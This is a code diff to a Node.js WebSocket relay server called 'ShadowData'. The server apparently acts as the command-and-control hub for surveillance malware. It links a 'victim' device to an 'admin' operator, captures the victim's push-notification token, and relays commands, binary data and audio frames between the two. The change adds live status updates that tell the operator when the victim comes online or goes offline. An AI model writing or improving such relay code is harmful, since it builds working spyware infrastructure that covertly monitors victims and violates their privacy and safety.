@@ -22,8 +22,16 @@ let victimSocket = null;
 let adminSocket = null;
 let latestVictimFcmToken = process.env.VICTIM_FCM_TOKEN || "";
 
+// Helper function to broadcast victim online/offline status to the admin dashboard
+function broadcastVictimStatus() {
+    if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
+        const isOnline = victimSocket !== null && victimSocket.readyState === WebSocket.OPEN;
+        adminSocket.send(JSON.stringify({ type: "VICTIM_STATUS", connected: isOnline }));
+    }
+}
+
 app.get('/', (req, res) => {
-    res.send(`ShadowData Relay Server Active.<br>Victim Connected: ${!!victimSocket}<br>Admin Connected: ${!!adminSocket}`);
+    res.send(`ShadowData Relay Server Active.<br>Victim Connected: ${!!victimSocket && victimSocket.readyState === WebSocket.OPEN}<br>Admin Connected: ${!!adminSocket && adminSocket.readyState === WebSocket.OPEN}`);
 });
 
 // Heartbeat interval to keep Render WebSocket connections alive
@@ -48,21 +56,20 @@ wss.on('connection', (ws, req) => {
         }
         victimSocket = ws;
         console.log('>>> Victim connected successfully.');
+        broadcastVictimStatus(); // Notify admin that victim is online
     } else if (role === 'admin') {
         if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
             adminSocket.terminate();
         }
         adminSocket = ws;
         console.log('>>> Admin connected successfully.');
+        broadcastVictimStatus(); // Send current victim status to newly connected admin
     }
 
     ws.on('message', (message, isBinary) => {
-        // Check if the message is text or binary safely using ws library's second parameter (isBinary)
-        // or fallback to Buffer.isBuffer(message)
         const binaryFlag = typeof isBinary !== 'undefined' ? isBinary : Buffer.isBuffer(message);
 
         if (binaryFlag) {
-            // Route binary frames directly without string conversion
             if (role === 'admin') {
                 if (victimSocket && victimSocket.readyState === WebSocket.OPEN) {
                     victimSocket.send(message, { binary: true });
@@ -73,7 +80,6 @@ wss.on('connection', (ws, req) => {
                 }
             }
         } else {
-            // Handle text payloads (JSON, commands, or text-prefixed frames like AUDIO_FRAME:)
             const textMessage = message.toString();
 
             // Capture victim FCM Token registration on startup
@@ -150,6 +156,7 @@ wss.on('connection', (ws, req) => {
         if (ws === victimSocket) {
             victimSocket = null;
             console.log('XXX Victim disconnected.');
+            broadcastVictimStatus(); // Notify admin that victim went offline
         }
         if (ws === adminSocket) {
             adminSocket = null;
